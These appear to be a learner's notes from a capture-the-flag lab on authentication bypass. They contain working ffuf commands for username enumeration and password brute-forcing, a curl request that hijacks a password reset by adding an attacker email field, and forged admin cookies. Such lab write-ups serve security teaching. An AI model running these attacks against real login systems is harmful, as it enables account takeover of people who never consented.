# authorization bypassing

We're using ffuf (fuzz faster you fool) To enumerate usernames through the signupform

The tool sends a http POST and compares the response if the reply contains 'username already exists' that is a valid user.
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://[remoteServerIP]/customers/signup -mr "username already exists"
## Usernames

admin
robert
simon
steve


save these to txt file

then ffuf away:

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://[remoteServerIP]/customers/login -fc 200

## Logic Flaws

reset password

use email robert@acmeitsupport.thm username robert

then try curl 
'http://10.10.149.92/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

There is a flaw in the app logic that will send the reset password email to anyone. add an email field to the http request.

By signing up for an acmeitsupport account you get a {username}@customer.acmeitsupport.thm email address. Emails to this account show up as support tickets.

make an account attacker:password and then curl:

curl 'http://[remoteMachineIPAddress]/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@customer.acmeitsupport.thm'

log on as your attacker account and retrieve secret URL from the ticket which will log you in as robert and see his tickets for the THM{KEY}

### Cookies

fiddling about with the cookies

curl http://10.10.149.92/cookie-test

curl -H "Cookie: logged_in=true; admin=false" http://10.10.149.92/cookie-test
for non admin

and for admin:
curl -H "Cookie: logged_in=true; admin=true" http://10.10.149.92/cookie-test

We then walk through some hashing 
md5 use crackstation:
463729

echo VEhNe0JBU0U2NF9FTkNPRElOR30= | base64 --decode
THM{BASE64_ENCODING}

encode the value *in inverted commas*: 
echo '{"id":1,"admin":true}' | base64
eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==

